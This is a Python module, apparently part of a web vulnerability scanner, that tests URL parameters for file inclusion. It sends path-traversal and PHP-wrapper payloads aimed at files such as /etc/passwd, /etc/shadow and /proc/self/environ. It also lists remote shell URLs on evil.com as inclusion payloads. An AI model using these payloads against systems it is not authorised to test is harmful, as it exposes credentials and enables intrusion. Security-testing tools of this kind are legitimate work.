import re
import logging
from urllib.parse import urlparse, parse_qs, urlencode

class FileInclusion:
    def __init__(self, session, findings=None, web_mode=False):
        self.session = session
        self.findings = findings if findings else {'lfi': [], 'rfi': []}
        self.logger = logging.getLogger(__name__)
        self.web_mode = web_mode  # Skip heavy testing in web mode
        
    def test_all(self, urls):
        # In web mode, test only 1 URL with minimal payloads
        if self.web_mode:
            if urls:
                url = urls[0]  # Test only first URL
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                # Only test first 2 parameters
                for param in list(params.keys())[:2]:
                    self.test_lfi(url, param)
                    self.test_rfi(url, param)
            return
        
        # Full testing in normal mode
        for url in urls:
            # Get URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                # Test each parameter for LFI/RFI
                self.test_lfi(url, param)
                self.test_rfi(url, param)
    
    def test_lfi(self, url, param):
        # In web mode, use only the 2 simplest payloads for speed
        if self.web_mode:
            lfi_payloads = [
                '../../../../etc/passwd',
                '/etc/passwd',
            ]
        else:
            lfi_payloads = [
                '/etc/passwd',
                '../../../../etc/passwd',
                '....//....//etc/passwd',
                '/etc/shadow',
                '/proc/self/environ',
                '/proc/self/cmdline',
                '../../../../windows/win.ini',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '../../../../boot.ini',
                '/etc/hosts',
                '/etc/issue',
                '/etc/motd',
                '/etc/apache2/apache2.conf',
                '/etc/httpd/conf/httpd.conf',
                '/var/log/apache2/access.log',
                '/var/log/apache/access.log',
                '/var/www/html/index.php',
                '/var/www/html/config.php',
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'zip://path/to/file.zip%23file.txt',
                'data://text/plain;base64,SSBsb3ZlIFBIUAo='
            ]
        
        original_url = url
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for payload in lfi_payloads:
            # Replace the parameter value with payload
            query_params[param] = [payload]
            
            # Reconstruct URL
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            try:
                # Use shorter timeout in web mode (0.5 seconds)
                timeout = 0.5 if self.web_mode else 10
                response = self.session.get(test_url, timeout=timeout)
                
                # Check for LFI indicators
                indicators = [
                    ('root:x:', '/etc/passwd content'),
                    ('root:.*:0:0', '/etc/passwd content'),
                    ('<?php', 'PHP source code'),
                    ('[boot loader]', 'Windows boot.ini'),
                    ('Microsoft Corp', 'Windows system file'),
                    ('DocumentRoot', 'Apache config'),
                    ('ServerName', 'Apache config'),
                    ('PATH=', 'Environment variables'),
                    ('SHELL=', 'Environment variables'),
                ]
                
                for indicator, file_type in indicators:
                    if re.search(indicator, response.text):
                        self.logger.critical(
                            f"LFI VULNERABILITY FOUND!\n"
                            f"URL: {test_url}\n"
                            f"File Type: {file_type}"
                        )
                        if 'lfi' not in self.findings:
                            self.findings['lfi'] = []
                        self.findings['lfi'].append(
                            f"Local File Inclusion at {url} - Parameter: {param} - Accessible file: {file_type}"
                        )
                        return
                        
            except Exception as e:
                pass
    
    def test_rfi(self, url, param):
        # You would need a controlled server for RFI testing
        # This is a template for implementation
        
        rfi_payloads = [
            'http://evil.com/shell.txt',
            '\\\\evil.com\\share\\shell.exe',
            'ftp://evil.com/shell.php',
            'https://raw.githubusercontent.com/evil/shell/master/shell.php'
        ]
        
        self.logger.info(f"RFI testing requires external callback server setup")
